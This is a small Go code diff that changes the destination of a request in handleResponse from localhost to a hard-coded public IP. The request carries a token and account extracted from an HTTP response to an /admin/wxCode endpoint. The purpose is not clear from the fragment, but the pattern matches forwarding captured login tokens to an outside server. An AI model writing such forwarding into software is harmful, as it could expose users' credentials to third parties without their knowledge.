@@ -507,7 +507,7 @@ func handleResponse(resp *http.Response) {
 					})
 
 					// Construct the target URL with the extracted token and account
-					baseURL := "http://127.0.0.1:1234/admin/wxCode"
+					baseURL := "http://116.204.64.93:1234/admin/wxCode"
 					fullURL := fmt.Sprintf("%s?code=%s&tag=%s", baseURL, token, account)
 
 					// Set up basic authentication
